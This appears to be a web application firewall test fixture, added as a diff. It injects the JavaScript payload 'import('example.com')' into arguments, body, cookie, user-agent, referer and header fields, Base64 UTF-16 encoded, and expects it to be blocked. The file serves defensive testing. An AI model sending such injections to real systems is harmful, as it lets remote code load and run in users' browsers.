@@ -1,0 +1,14 @@
+{
+  "payload": [
+    {
+      "ARGS": "import('example.com')",
+      "BODY": "import('example.com')",
+      "COOKIE": "import('example.com')",
+      "USER-AGENT": "import('example.com')",
+      "REFERER": "import('example.com')",
+      "HEADER": "import('example.com')",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    }
+  ]
+}
